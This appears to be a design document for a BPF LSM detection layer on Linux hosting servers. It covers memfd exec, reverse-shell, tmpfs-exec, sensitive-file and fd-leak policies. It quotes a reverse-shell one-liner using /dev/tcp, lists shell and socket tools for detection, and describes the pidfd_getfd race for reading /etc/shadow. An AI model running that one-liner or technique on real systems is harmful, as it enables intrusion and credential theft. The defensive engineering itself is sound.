# cfm-lsm — Userspace Behaviour Enforcement

## Status

**Ten policies shipping. Disabled by default in `lsm.conf`; monitor is
the safe first enabled mode. Enforce is opt-in for EXEC-001 / EXEC-003 /
EXEC-004 / EXEC-006 / FS-005. EXEC-005, FS-006, CRED-002,
CRED-003, and BPF-001 are monitor-only by design (weak stdio
telemetry, credential telemetry, and syscall tracepoints are not safe
blocking points).**

Catalog:

- `CFML-EXEC-001` — Block exec from memfd
- `CFML-EXEC-003` — Reverse shell pattern
- `CFML-EXEC-004` — Deleted-file exec by web user
- `CFML-EXEC-005` — Suspicious interpreter network stdio *(monitor-only)*
- `CFML-EXEC-006` — Web-user exec from ephemeral filesystem
- `CFML-FS-005`   — Sensitive-file modification by web user
- `CFML-FS-006`   — Sensitive read via root-owned fd from unprivileged task *(monitor-only)*
- `CFML-CRED-002` — Privilege escalation without setuid path *(monitor-only)*
- `CFML-CRED-003` — Direct root credential install *(monitor-only)*
- `CFML-BPF-001`  — Unexpected BPF use *(monitor-only advanced-threat telemetry)*

Companion kernsec rule `KSEC-LSM-bpf-001` merges `bpf` into the
operator's existing `lsm=` boot argument when forced in
`/etc/cfm/kernsec.conf`, without disrupting other LSMs. Required
on distros where `bpf` is not in the default LSM list (most non-EL10
kernels). Opt-in.

All BPF LSM policies are implemented, compiled, and verified to
load on EL10 (kernel 6.12). The end-to-end flow:

```
operator: edit /etc/cfm/lsm.conf  →  enabled = true; pick per-policy mode
operator: systemctl restart cfm   →  daemon auto-enables on startup
cfm daemon: ApplyConfig           →  if pins absent (post-reboot or fresh):
                                       preflight + load + attach + pin
                                     if pins present (operator pre-enabled):
                                       adopt them
kernel  : detects events          →  BPF LSM hooks fire on matches
cfm daemon: drain ringbuf         →  emit notify + log + dmesg DETECT lines
operator: cfm lsm disable         →  unpin, kernel detaches (daemon stays up)
```

**Reboot semantics.** `/sys/fs/bpf` is a RAM-only kernel filesystem,
so a reboot wipes every pinned BPF object. The daemon handles this:
on every startup it inspects bpffs, and if no pins are found it
re-runs the load + attach + pin work itself. From the operator's
perspective, `enabled = true` in `lsm.conf` is the long-lived
declarative state; everything else is plumbing.

**`cfm lsm enable` is still useful.** Operators who want to
activate cfm-lsm immediately without restarting the daemon — or
who want the interactive enforce-mode confirmation prompt — can
run it directly. The daemon's auto-enable picks the same path.

Protection survives daemon restarts (the pins live in bpffs, not
in the daemon process), daemon crashes, and `systemctl stop cfm`
WITHIN the same kernel boot. After a reboot, the daemon's
auto-enable re-establishes protection on the way back up. Event
*collection* depends on the daemon (it drains the pinned ringbuf
and forwards events into the notify pipeline); event *detection*
does not.

All ten policies default to `mode = disabled` in the shipped
`lsm.conf`; the operator opts in per policy by setting `monitor`
or `enforce`. Enforce mode (return `-EPERM` on a match, failing the
calling process's syscall) is **available** for `CFML-EXEC-001`,
`CFML-EXEC-003`, `CFML-EXEC-004`, `CFML-EXEC-006`, and `CFML-FS-005`.
`CFML-EXEC-005`, `CFML-CRED-002`, `CFML-CRED-003`, and
`CFML-BPF-001` are monitor-only by design (returning -EPERM from
credential hooks can deadlock systemd helpers and pkexec
mid-transition; CRED-003 is `fentry` telemetry and BPF-001 is a
syscall tracepoint, neither of which is an LSM decision point; and
EXEC-005 is a deliberately lower-confidence companion to EXEC-003
that is unsafe to block on). `enable.go` and `lifecycle.go` downgrade
an enforce setting on those four to monitor with a warning. Set
`mode = enforce` in `/etc/cfm/lsm.conf` and restart cfm (or run
`cfm lsm disable` then re-enable). The mechanism is a
`volatile const` global in the BPF program rewritten at load time
via `cilium/ebpf`'s `spec.Variables[name].Set()`, so enforce/monitor
is baked into the program's instruction stream — one byte-compare
per match path, no runtime branching cost. `cfm lsm enable` prompts
for confirmation when any policy is enforce; `--yes` skips the
prompt for unattended scripts. Recovery from a false-positive
enforce block is one command: `cfm lsm disable`.

This document supersedes an earlier broader draft that proposed a
fifteen-policy BPF LSM component spanning exec, credential, filesystem,
network, rate-limit, self-protection, and observability rules. After
evaluating that draft against the actual CFM tree and the production
stacks CFM targets (cPanel + CloudLinux + KernelCare, DirectAdmin +
CloudLinux + KernelCare, Proxmox Debian KVM ZFS), most of the proposed
catalogue duplicated protections already provided by CageFS, LVE,
Imunify360 Proactive Defense, `kernsec`, and `internal/outbound/`, and
a few policies actively conflicted with the rest of the stack (notably
KernelCare/Ksplice module reloads vs the proposed module-load lockdown,
and Yama `ptrace_scope=1` already shipped by `kernsec` vs the proposed
ptrace LSM rule).

The scope here is intentionally narrow: ten shipping policies
covering exec (CFML-EXEC-001 / CFML-EXEC-003 / CFML-EXEC-004 /
CFML-EXEC-005 / CFML-EXEC-006), sensitive-file write (CFML-FS-005),
sensitive-read fd-leak telemetry (CFML-FS-006), post-setuid credential
transitions (CFML-CRED-002), direct root credential installs
(CFML-CRED-003), and advanced-threat BPF-use telemetry (CFML-BPF-001).
The MVP shipped with EXEC-001 + EXEC-003 only; FS-005 + CRED-002
landed as the next-policies pass once the MVP's verifier and pinning
behaviour proved stable on EL10. CRED-003 closes the documented direct
`commit_creds()` gap as monitor-only telemetry, and BPF-001 adds
monitor-only visibility into unexpected BPF map creation / program
load attempts. EXEC-005 adds monitor-only weak stdio telemetry next to
the strict reverse-shell rule. EXEC-006 covers the
write-to-ephemeral-fs-then-exec pattern that the other exec detectors
miss, complementing Imunify Proactive Defense's PHP-layer write block.
Anything beyond these ten requires a separate, named proposal — not a
TODO inside this doc.

The implementation shape is also fixed: an in-binary subsystem of the
existing CFM daemon at `internal/lsm/`, loading CO-RE BPF LSM programs
via [`cilium/ebpf`](https://github.com/cilium/ebpf). No separate
daemon, no kernel module, no DKMS, no clang on the customer host. CFM
stays `CGO_ENABLED=0`. See the Architecture section for details.

## Overview

`cfm-lsm` is the CFM component that catches the post-exploit consequences
of a successful userspace compromise: a webshell that drops a payload and
tries to execute it from memory, or a hijacked process that pivots into a
reverse shell. These behaviours are invisible to the other CFM layers —
`webdetector` has already returned by the time exec happens, and
`kernsec` operates on preemptive surface reduction (sysctls, boot
arguments, module blacklists, mount audit) rather than runtime decisions.

`cfm-lsm` deliberately is not a generic syscall observer (that is
Tetragon's design space, not CFM's); not a replacement for CageFS, LVE,
or Imunify360 (it sits alongside them); and not an outbound network
policy engine — that work belongs in the existing per-uid NFLOG path
in `internal/outbound/`, which is already designed for exactly that
problem and works on EL8 without DKMS.

## Position in the CFM stack

```
HTTP layer        webdetector       (inbound request analysis, vhost policy,
                                     challenge/block via nftables)
                       ↓
Userspace layer   cfm-lsm           (process behaviour: memfd exec,
                                     reverse shell pattern)
                       ↓
Kernel layer      kernsec           (sysctls, boot args, modules, fstab —
                                     preemptive surface reduction)
```

Each layer detects what the others cannot. `cfm-lsm` occupies the
narrow band between "the HTTP request that caused the compromise" and
"the kernel-surface that the operator already removed" — specifically,
the moment a compromised process tries to do the thing the attacker
came for.

## Scope rationale

The original draft listed fifteen policies; this design now ships ten narrowly scoped policies.
Every other ID from that draft is excluded for a specific reason — not
deferred, excluded — because some other layer in CFM's expected stack
already covers it, or because the policy actively conflicts with
something else CFM relies on.

| Policy | Decision | Reason |
|---|---|---|
| `CFML-EXEC-001` (memfd exec) | **In** | High-signal, low-FP; Imunify PD cannot see past the PHP→child process boundary; no other CFM layer covers this. Enforce available. |
| `CFML-EXEC-003` (reverse shell pattern) | **In** | Behavioural detection; covers ground Imunify PD blocks at *launch* but cannot catch *post-spawn*; no other CFM layer covers this. Enforce available. |
| `CFML-EXEC-004` (deleted-file exec by web user) | **In** | Catches the upload-open-unlink-exec staging pattern by web-class uids. Enforce available after local telemetry confirms backup/deploy agents do not match. |
| `CFML-EXEC-005` (suspicious interpreter network stdio) | **In, monitor-only** | Weak companion telemetry for one or two remote stdio fds on shell/interpreter/socket-helper execs; intentionally not a default block due to inetd/admin/debug FPs. |
| `CFML-EXEC-006` (web-user exec from ephemeral filesystem) | **In** | Execution-phase companion to Imunify PD's write-phase guard. Catches a watched uid exec'ing a binary on tmpfs (/dev/shm, /run/user/, distro /tmp on tmpfs) or under /tmp/ or /var/tmp/ on EL9-style root-filesystem /tmp. Enforce available after monitor-mode telemetry confirms legitimate /tmp-based workflows (package installers, easyapache builds) are allowlisted. |
| `CFML-FS-005` (sensitive-file write by web user) | **In** | High-signal post-exploit cash-in catch. CageFS hides the paths from caged users, so any FS-005 fire on a caged host is itself a compromise indicator. Enforce available for current-uid matches on the core auth set; persistence-path additions and origin-only matches stay monitor-only. |
| `CFML-FS-006` (sensitive read via root-owned fd from unprivileged task) | **In, monitor-only** | Kernel-side fingerprint of the setuid-helper fd-leak class — `pidfd_getfd()` exit-window race against ssh-keysign / chage / unix_chkpwd (Qualys / Linus commit `31e62c2ebbfd`), plus older `CLONE_FILES` + setuid-exec and `/proc/<pid>/fd/<n>` variants. Kernsec `kernel.yama.ptrace_scope=2` kills the modern `pidfd_getfd()` primitive, but operators who `state = skip` that rule for same-uid debuggability lose the kernel-level block — FS-006 is their belt-and-braces layer. Monitor-only by design: passwd / pkexec / sudo / dovecot-auth / postfix workers legitimately read the FS-005 watched-inodes set after dropping privs. |
| `CFML-CRED-002` (privesc without setuid path) | **In, monitor-only** | Canonical post-exploit fingerprint: non-root → root via a setuid syscall from a binary not on the suid-bit allowlist. Enforce is unsafe (cred-install deadlocks systemd / pkexec mid-transition) so it is permanently monitor-only. |
| `CFML-CRED-003` (direct root cred install) | **In, monitor-only** | Complements CRED-002 for kernel-exploit payloads that bypass the setuid syscall entirely via `commit_creds(prepare_kernel_cred(NULL))`. `fentry` tracing, not an LSM decision point — monitor-only by construction. |
| `CFML-BPF-001` (unexpected BPF use) | **In, monitor-only** | Advanced-threat telemetry for `bpf()` `BPF_MAP_CREATE` / `BPF_PROG_LOAD` outside CFM + a small trusted-agent set, plus watched web/panel uids. Broad surface reduction belongs in `kernsec` sysctls (`unprivileged_bpf_disabled`, `bpf_jit_harden`); this rule is monitor-only by construction. |
| `CFML-EXEC-002` (Trusted Path Execution) | **Out** | High FP from composer / npm / pip / wp-cli; CageFS + Imunify PD + `kernsec`'s `noexec` mount audit already cover the realistic vector. |
| `CFML-OBS-001` (ptrace lockdown) | **Out — already covered by `kernsec`** | `kernel.yama.ptrace_scope=1` is shipped today by `kernsec` (see `internal/kernsec/profile.go:188`). If stricter is wanted, ship `=2` as a `kernsec` Tier 2 sysctl rule — no new code, no new LSM hook. |
| `CFML-NET-001` (outbound per vhost) | **Out — wrong component** | `internal/outbound/analyzer.go` already does per-uid NFLOG-based outbound observation. Promoting that path to enforce + per-vhost policy is the right home for this; it works on EL8 with no DKMS and reuses an existing event pipeline. |
| `CFML-FS-001`, `CFML-FS-002`, `CFML-FS-003`, `CFML-CRED-001`, `CFML-RATE-*`, `CFML-SELF-001`, `CFML-SELF-002` | **Out** | Each is covered by an existing layer: CageFS for FS-write vectors on caged users, LVE for fork/rate, `kernsec` for module surface (and `CFML-SELF-002` would actively conflict with KernelCare/Ksplice live-patch module reloads), webdetector for webshell-drop correlation. If any one of these later proves necessary it will be added in a separate, named proposal — not as an open TODO in this doc. |

## Stack-specific notes

**cPanel + CloudLinux + KernelCare.** All ten policies apply. Per-user
CageFS already namespaces PHP-FPM workers away from the FS-write vectors
the excluded `CFML-FS-*` policies aimed at, and lifts FS-005's
false-positive floor to near zero: a caged web user reaching `/etc/shadow`
or `/root/.ssh/` means caging itself was bypassed. KernelCare's live-patch
module loads post-boot, but cfm-lsm does not constrain module loading at
all, so there is nothing to whitelist.

**DirectAdmin + CloudLinux + KernelCare.** Same as cPanel; FS-005's
watched-uid set is sourced from `/etc/virtual/domainowners` instead.

**Proxmox Debian KVM ZFS.** Hypervisor hosts run essentially no PHP
workload, so the value of `cfm-lsm` is narrower: catch a reverse shell
or memfd exec on the hypervisor itself, and catch sensitive-file writes
or unexpected root credential installs. That is still worth doing on
hosts with administrative SSH exposure. The host-profile signal in
`internal/kernsec/profile.go` already records Proxmox as a context;
operators on hypervisors typically restrict the active policy set to
EXEC-001 + FS-005 + CRED-002/003 and leave EXEC-003 disabled because
the legitimate baseline of remote-stdio shells (admin SSH consoles) is
wider on a hypervisor than on a web host.

## Policy catalogue

### `CFML-EXEC-001` — Block exec from memfd

| | |
|---|---|
| Hook | `bprm_check_security` |
| Shipped default | `disabled` (operator opts in to `monitor` or `enforce`) |
| Enforce | Available |
| FP risk | Very low |
| Perf impact | Negligible (exec is not a hot path) |

**Description.** Refuse `execve` when the `bprm`'s backing file has no
on-disk path — i.e. when it is anonymous shmem from `memfd_create` or
equivalent. The mechanism in BPF is to inspect `bprm->file`, check that
the superblock magic is `TMPFS_MAGIC`, and that the dentry has no
linked path. If both hold, return `-EPERM`.

**Rationale.** `memfd_create` + `execve` is the canonical fileless
payload pattern. It is the next step after a webshell finishes
downloading a binary into memory, and it is the technique most
post-exploit kits reach for once they realise the disk is monitored.
Legitimate uses on hosting servers are vanishingly rare. The
signal-to-noise ratio of this single rule is higher than any other
behaviour-detection rule in the original fifteen-policy draft.

**Exemptions.** uid 0 with a TTY (interactive root); a configured
parent-process whitelist for legitimate build tooling that genuinely
needs it; an optional per-host opt-out for podman / systemd-nspawn on
Proxmox hypervisors that legitimately exec from anonymous fds during
container start.

**Notes.** Exec is a cold path. Perf overhead is invisible. This is
the rule to ship first, monitor briefly, and promote to enforce.

### `CFML-EXEC-003` — Reverse shell pattern

| | |
|---|---|
| Hook | `bprm_check_security` |
| Shipped default | `disabled` (operator opts in to `monitor` or `enforce`) |
| Enforce | Available |
| FP risk | Low |
| Perf impact | Negligible |

**Description.** At `bprm_check`, walk the task's fd table for fds
0, 1, and 2. For each, check whether it is socket-backed and whether
the socket is connected to a remote peer — not a pty, not a unix-domain
socket to a local service, not a regular file. A process about to exec
with all three of stdin / stdout / stderr dup'd to a connected remote
socket is a reverse shell, regardless of which binary it is (`bash`,
`nc`, `socat`, `python -c`, `perl -e`, obfuscated one-liners).

**Rationale.** Behavioural detection, not binary match. Imunify PD
blocks the *call* that launches `bash -i >& /dev/tcp/x/y`; this rule
catches the resulting `bash` process *being* a reverse shell. The two
layers are complementary: PD covers the PHP-originating launch,
`cfm-lsm` covers the spawned process. The combination is robust against
the most common evasion of PD (using the launcher binary directly,
without going through `exec`/`system`/`shell_exec` in PHP first).

**Exemptions.** uid 0 (root reverse shells are an administrative
choice, not an attack vector to enforce against). An explicit per-host
list for any legitimate inetd-style services that genuinely dup socket
fds onto 0/1/2 — these are rare on hosting boxes.

**Notes.** The fd walk is the implementation cost driver and the
verifier-complexity risk on older RHEL 9 kernels. The hot loop must be
bounded (cap at fd ≤ 2) and the socket-state read must use existing CO-RE
relocations rather than custom field offsets. Budget verifier complexity
explicitly before committing the design to that hook layout.

### `CFML-EXEC-005` — Suspicious interpreter network stdio

| | |
|---|---|
| Hook | `bprm_check_security` |
| Default mode | `disabled` / monitor-only when enabled; never enforce by default |
| FP risk | Medium; weak telemetry by design |
| Perf impact | Negligible (exec-time fd 0/1/2 inspection only) |

**Description.** This is a monitor-only companion to `CFML-EXEC-003`.
It reuses the same fd inspection helper that identifies established
remote TCP sockets on stdin/stdout/stderr, but it matches the weaker
case where exactly one or two of fd 0/1/2 are remote TCP and the
executable basename is one of a small static shell/interpreter/helper
set: `sh`, `bash`, `dash`, `zsh`, `python`, `python3`, `perl`, `php`,
`ruby`, `node`, `nc`, `ncat`, or `socat`. If all three stdio fds are
remote TCP, the strict `CFML-EXEC-003` reverse-shell rule owns that
event instead.

**Event flags.** Strict reverse-shell events set
`CFM_LSM_F_REVSHELL_STRICT`. EXEC-005 events set
`CFM_LSM_F_INTERP_STDIO_WEAK` plus either
`CFM_LSM_F_STDIO_ONE_REMOTE` or `CFM_LSM_F_STDIO_TWO_REMOTE`, allowing
the daemon and downstream analytics to separate weak telemetry from
strict all-three-fd reverse-shell matches without changing the event
wire layout.

**Expected false positives.** This rule intentionally observes
patterns that can be legitimate: inetd-style services and socket
activators that hand a network socket to a child process, administrator
one-liners that use `nc`, `socat`, or an interpreter over a socket, and
live debugging / incident-response sessions where one side of stdio is
redirected over TCP. Operators should start with `mode = monitor` (or
leave it disabled) and use the event flags and executable path as
triage context. Do not promote this companion rule to default enforce;
blocking belongs to `CFML-EXEC-003` after its stricter all-three-fd
telemetry has been validated locally.

### `CFML-EXEC-004` — Deleted-file exec by web user

| | |
|---|---|
| Hook | `bprm_check_security` |
| Default mode | `monitor`; enforce is opt-in after telemetry |
| FP risk | Unknown-low; intentionally monitor-first |
| Perf impact | Negligible (exec is not a hot path) |

**Description.** At `bprm_check_security`, inspect
`bprm->file->f_path.dentry` and the backing inode. A process that
opens a payload, unlinks it, and then executes the still-open file
typically leaves two kernel-side clues: the inode link count is zero
and/or the dentry has been unhashed from the namespace. `CFML-EXEC-004`
emits an event when either state is present and the calling uid is in
`cfm_watched_uids` (the daemon-populated web-class uid set used by
`CFML-FS-005`). The implementation also consumes the web-origin task
state when that tracker is enabled, but origin-only matches remain
monitor-only while telemetry is gathered.

**Rationale.** Deleted-file exec is a common stealth step after web
compromise: stage a binary on disk, open it, unlink it to evade simple
path-based scanners and cleanup sweeps, then execute via the open file
descriptor. The behaviour is more specific than “web user execs from
/tmp” and complements `CFML-EXEC-001`: memfd/fileless payloads stay
owned by EXEC-001, while EXEC-004 covers ordinary filesystem payloads
that were subsequently unlinked.

**Enforcement.** The default and recommended production rollout is
`mode = monitor`. `mode = enforce` is supported but should be enabled
only after host-local telemetry confirms no legitimate panel helpers,
backup tools, deployment systems, or AV/updater workflows execute
unlinked files under web-class uids. Web-origin-only matches are
reported but not blocked even when the policy is set to enforce.

**Example config.**

```ini
[policy "CFML-EXEC-004"]
mode = monitor   # start here; promote to enforce only after telemetry

# Later, on hosts with a clean baseline:
# mode = enforce
```

### `CFML-EXEC-006` — Web-user exec from ephemeral filesystem

| | |
|---|---|
| Hook | `bprm_check_security` |
| Shipped default | `disabled` (operator opts in to `monitor` or `enforce`) |
| Enforce | Available after monitor-mode telemetry and allowlist tuning |
| FP risk | Medium until allowlist tuned (package installers, easyapache mid-build steps, distro ldconfig helpers) |
| Perf impact | Negligible (exec is not a hot path; a single super-block magic read plus a bounded dentry walk on the non-tmpfs branch) |

**Description.** At `bprm_check_security`, if the calling uid is in
`cfm_watched_uids` (the daemon-populated web-class uid set used by
FS-005 / EXEC-004), inspect the file being exec'd. Match when either:

  1. the backing super-block magic is `TMPFS_MAGIC` — covering `/dev/shm`
     (always tmpfs), `/run/user/<uid>/` (per-user systemd runtime), and
     distro `/tmp` mounted as tmpfs (most modern Linux); or
  2. the dentry walks up to `/tmp/...` or `/var/tmp/...` on a non-tmpfs
     root filesystem (EL9 / CloudLinux 9 default).

The walk is bounded by `#pragma unroll` so the verifier accepts it on
every supported kernel. The magic-check path is O(1); the dentry walk
adds at most 16 `d_parent` reads. memfd payloads (which also have
`TMPFS_MAGIC`) are deliberately skipped here — `CFML-EXEC-001` owns
that telemetry.

**Rationale.** This is the execution-phase companion to Imunify
Proactive Defense's write-phase guard. Imunify catches `fopen` /
`fwrite` from the PHP VM into `/tmp/.<hidden>`; `CFML-EXEC-006` catches
the resulting `execve` from kernel space. On a representative
production host (titan.myip.gr), Imunify blocked 275 staged PHP
payloads against `/tmp/.<obfuscated>` paths in a single hour from one
web user — every one of those payloads, if the write had succeeded
past Imunify, would have produced an EXEC-006 event when the worker
exec'd it. The two layers are complementary: PD covers the launch,
`cfm-lsm` covers the kernel-side execve.

Distinct from the other exec detectors:

  - `EXEC-001` (memfd exec) — fires only on `memfd_create()`-backed
    exec; not on real files in `/tmp`.
  - `EXEC-003` (reverse shell) — fires on remote-socket stdio at
    exec; not about the file's location.
  - `EXEC-004` (deleted-file exec) — fires when the backing dentry is
    unlinked at exec time; misses the "wrote a payload to /tmp and
    exec'd it without unlinking" case that EXEC-006 catches.

**Enforcement.** `mode = enforce` returns `-EPERM` from
`bprm_check_security`, failing the calling task's `execve()`.
Operators should run in monitor for at least a week on a
representative host and review the resulting FPs before promoting:
package-manager extractions, cPanel `easyapache` build steps, distro
`ldconfig` re-runs, container runtime helpers, and similar legitimate
ephemeral-fs execs need explicit allowlisting first.

**Allowlist surface.** The policy honours per-policy `allow_exe`,
`allow_comm`, and `allow_path` plus the global `[allow]` section.
Match shape:

  - `allow_exe = /tmp/easyapache/build-helper` — basename match against
    the event's emitted filename in the userspace filter.
  - `allow_comm = my-installer` — `task->comm` match (kernel truncates
    to 15 chars).
  - `allow_path = /tmp/known-good-build-area/` — directory-prefix
    match against any `argv` element in `/proc/<pid>/cmdline` at event
    time. Useful when the operator can scope a trusted subtree under
    an otherwise-ephemeral root.

**Example config.**

```ini
[policy "CFML-EXEC-006"]
mode = monitor   # start here; review FPs for ~1 week
# allow_exe = /tmp/easyapache/build-helper

# Later, on hosts with a clean baseline:
# mode = enforce
```

**Out of scope for this slice.** Per-uid `/run/user/<uid>/` path
narrowing (the super-block magic covers it; the dentry-walk branch
deliberately does not match `/run/user/...` since tmpfs already
catches it). RPM/dpkg-database signed-binary checking is left out by
design — operators who want fmpath-style exception lists add them via
`allow_exe` / `allow_path`.

### `CFML-FS-005` — Sensitive-file modification by web user

| | |
|---|---|
| Hook(s) | `inode_setattr`, `inode_create`, `inode_link`, `inode_unlink`, `inode_rename`, `inode_setxattr`; origin markers on `bprm_check_security`, `task_fix_setuid`, and `task_alloc` |
| Shipped default | `disabled` (operator opts in to `monitor` or `enforce`) |
| Enforce | Available for current-uid matches; origin-only matches stay monitor-only |
| FP risk | Very low on CageFS hosts; low–medium on plain hosts |
| Perf impact | Negligible — only fires on rare write-class operations against a small inode set |

**Description.** Six write-class BPF LSM programs share one check helper.
Historically, that helper matched only the task's **current uid**: on every
write-class inode operation, it looks up the calling task's uid in the
daemon-populated `cfm_watched_uids` hash (web-class names — apache, nginx,
php-fpm, lsphp, alt-php-* — plus every cPanel and DirectAdmin account uid).
If matched, it looks up the target filesystem+inode key in
`cfm_watched_inodes` (the daemon stats the stable core list in
`internal/lsm/maps.go::DefaultCoreSensitivePaths`, the persistence list in
`DefaultPersistencePaths`, and any operator `persistence_path = ...` additions,
then records `st_dev` + `st_ino`). Both hits → emit event. Enforce mode can
return `-EPERM` only for entries marked as stable core paths; persistence-path
entries are monitor-only by default even when `mode = enforce`.

**Web-origin matching.** FS-005 can also run an origin tracker gated by
`origin_tracking = monitor` in `/etc/cfm/lsm.conf`. The tracker uses
task-local BPF storage to mark tasks whose real/effective/fs uid matches
`cfm_watched_uids`, refreshes that mark on exec and setuid-family transitions, and copies it to children on
fork/clone through the `task_alloc` hook. A later sensitive write therefore
still matches even if the process has become uid 0 by the time it touches the
file. Origin-only events set the FS-005 web-origin flag and are
**monitor-only** for now: they are reported even if `mode = enforce`, but they
do not return `-EPERM` until telemetry shows the false-positive rate is safe.

**Filesystem+inode matching avoids BPF-side path walking entirely.** For
operations that create new files under a watched directory (e.g.
`/etc/sudoers.d/backdoor`), the `inode_create` hook reads the parent
dentry's filesystem+inode identity and matches that against the
same set — the daemon includes the dir keys alongside the file keys.

**Rationale.** This is the high-value catch for kernel 0-day cash-ins.
A Dirty Pipe or pwnkit attacker that successfully escalated still has
to *use* the privilege — typically by writing to `/etc/shadow`,
`/etc/sudoers`, or `/root/.ssh/authorized_keys`. Those writes go
through the standard syscall path even when the privesc primitive
bypassed earlier LSM hooks, so cfm-lsm sees them.

**Enforcement.** Available via `mode = enforce` in `lsm.conf` for
current-uid matches on the stable core path set (`/etc/passwd`, `/etc/shadow`,
`/etc/group`, `/etc/gshadow`, `/etc/sudoers`). Web-origin-only matches and all
host-persistence path matches deliberately stay monitor-only while operators
build a baseline. This keeps the new persistence coverage inside `CFML-FS-005`
rather than creating `CFML-FS-006`, while preserving the original low-risk
enforcement boundary.

**Host-persistence paths.** The default monitor-only persistence set includes
common distro and panel locations used for durable post-exploit hooks:

| Host class | Example paths |
|---|---|
| Debian / Ubuntu / EL10 | `/etc/systemd/system`, `/etc/systemd/user`, `/etc/cron.d`, `/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.weekly`, `/etc/cron.monthly`, `/etc/crontab`, `/etc/sudoers.d`, `/etc/pam.d`, `/etc/ssh/sshd_config.d`, `/root/.ssh` |
| cPanel / WHM | `/usr/local/cpanel/hooks`, `/var/cpanel/hooks`, `/usr/local/cpanel/scripts/postupcp`, `/usr/local/cpanel/scripts/preupcp`, `/var/cpanel/perl5/lib`, `/var/cpanel/easy/apache/profile/custom` |
| DirectAdmin | `/usr/local/directadmin/scripts/custom`, `/usr/local/directadmin/data/templates/custom` |

Operators can add site-specific persistence locations without widening the
enforceable core set:

```ini
[policy "CFML-FS-005"]
mode = monitor
origin_tracking = monitor
persistence_path = /etc/systemd/system
persistence_path = /opt/vendor-panel/hooks
```

`persistence_path` values must be absolute concrete paths; glob expansion is not
performed in the BPF path. Missing paths are skipped at map-population time so a
single panel-specific entry can be present in a shared config across cPanel,
DirectAdmin, Debian/Ubuntu, and EL10 hosts.

**False-positive profile.** Current-uid matches retain the original FS-005
profile: very low on CageFS hosts and low–medium on plain hosts. Web-origin
matching is intentionally broader. It can alert on legitimate root helpers,
package hooks, or panel maintenance workers that were launched by a web/panel
account and later acquired uid 0 before touching a watched path. Those are
valuable forensic breadcrumbs during compromise response, but they need
monitor-mode review before any blocking decision.

### `CFML-FS-006` — Sensitive read via root-owned fd from unprivileged task

**Threat.** A setuid-root helper (`ssh-keysign`, `chage`, `unix_chkpwd`,
`passwd`, …) opens a sensitive file as root and an unprivileged task obtains a
reference to that already-opened `struct file` before the helper closes it.
The unprivileged task then reads the file via the leaked fd — its own
`current_cred()` stays at the original uid, but `file->f_cred->euid` is 0 and
the fd grants whatever access root had at open time. Working primitives in
this class include:

- **`pidfd_getfd()` exit-window race** — the modern variant. Attacker
  `fork+exec`s the setuid helper (so the attacker IS the parent, which Yama
  `ptrace_scope=1` allows through), opens a pidfd to the helper, and races
  `pidfd_getfd()` against the helper's exit window to clone the fd that
  pointed at `/etc/shadow`. Reported by Qualys against `ssh-keysign`; kernel
  fix at Linus commit `31e62c2ebbfd`. Reproducers like `chage_pwn` /
  `sshkeysign_pwn` (the README "try=N" loop counts the race iterations)
  succeed on stock RHEL/Alma/Rocky with `ptrace_scope=1`.
- **`CLONE_FILES` + setuid-exec** — older variant; parent and child share an
  fd table, child `execve`s the setuid helper, helper opens `/etc/shadow`,
  parent reads it through the shared table. Largely closed by modern kernels
  refusing setuid-exec across a shared `files_struct`, but worth blocking at
  the LSM layer anyway.
- **`/proc/<helper-pid>/fd/<n>`** — opportunistic; needs the
  `dumpable`-relaxed window. Lower yield on modern kernels but still feasible
  with `fs.suid_dumpable=1`.

**Hook.** `lsm/file_permission` — fires on every read/write through any fd,
which is the only point where the kernel knows both `current_cred()` (who is
acting now) and `file->f_cred` (who opened the file). `file_open` is too
early — the open happens in the privileged helper, not the attacker.
`file_receive` only fires on SCM_RIGHTS, which misses every primitive in this
class. The hook cost is paid on every `read(2)`/`write(2)` system-wide, so
the program early-returns on the cheap path (current is uid 0) before doing
any map lookup.

**Mechanism.** The BPF program performs three checks in order, fastest
first:

1. `current_cred()->euid != 0` — skip uid-0 callers entirely (root reading
   `/etc/shadow` is uninteresting and would dominate the event volume).
2. `file->f_cred->euid == 0` — only fires when the fd was opened in a
   privileged context. `BPF_CORE_READ(file, f_cred, euid.val)` keeps it
   CO-RE-portable across kernel versions.
3. `cfm_watched_inodes` lookup against the dentry's `(fs_id, ino)` — reuses
   the same map FS-005 populates from the sensitive-path table
   (`/etc/shadow`, `/etc/gshadow`, `/etc/sudoers`, `/etc/sudoers.d/*`,
   `/root/.ssh/*`, `/etc/ssh/ssh_host_*_key`, host-persistence additions).

All three pass → emit one `cfm_lsm_event` to the shared ringbuf with policy
id `CFML-FS-006`. The hook does not block — see "Mode" below.

**Mode.** Monitor-only by default and for the foreseeable future. Enforce is
unsafe because several legitimate authentication chains open the watched
files as root in one task and `read(2)` from a worker after dropping privs:

- `passwd`, `pkexec`, `sudo` — open `/etc/shadow` as root, then drop to the
  caller's uid for the readback compare.
- `unix_chkpwd` — invoked by PAM with the caller's uid; opens
  `/etc/shadow` via setuid root, reads it back from the same task after the
  setuid bit has dropped via `setresuid()`.
- `dovecot-auth` worker pool, `postfix smtpd_pickup`, some IMAP/SMTP MTAs
  — preopen `/etc/shadow` in a privileged supervisor and hand the fd (or
  the worker forks) to an unprivileged auth worker for the actual read.

Enforce would deny those reads and break authentication. Telemetry first; if
an enforce mode ever lands, the allow-list of `(comm, exe_inode)` pairs
permitted to do this has to be scrubbed against weeks of production data,
not guessed.

**Relationship to kernsec.** `kernsec` ships `kernel.yama.ptrace_scope=2`
(`KSEC-SCT-kspp.kernel-006`) in Tier 1, which closes the `pidfd_getfd()`
primitive at the kernel layer — that is the cheapest, broadest mitigation
for hosts that can accept it. FS-006 exists for hosts that cannot:
debug-heavy workstations, CI runners, observability hosts that need
`gdb --attach` / `strace -p` / `py-spy` without sudo. Those hosts
`state = skip` `KSEC-SCT-kspp.kernel-006` in `kernsec.conf` and accept
the residual exit-window race. FS-006 then gives them telemetry on any
read of a watched inode through a leaked root fd, regardless of which
primitive established the leak (pidfd_getfd, CLONE_FILES, /proc/fd, or a
future variant). It is defence-in-depth, not a replacement for the
sysctl.

**Why not enforce on a curated allow-list day one.** The legitimate-helper
set above varies by distro release, PAM stack, MTA choice, and panel
vendor (DirectAdmin, cPanel, CloudLinux, mailcow each spawn workers with
slightly different `comm` / exe-inode shapes). Enforce-by-allow-list
would need a stable inventory of "every `(comm, exe_inode)` that may
legitimately read a watched file through a root-opened fd," and that
inventory is only knowable empirically — which is what the monitor
telemetry window is for. The same reasoning applies as for CRED-002:
returning `-EPERM` from this hook mid-PAM-stack would deadlock the auth
session, not just block one read.

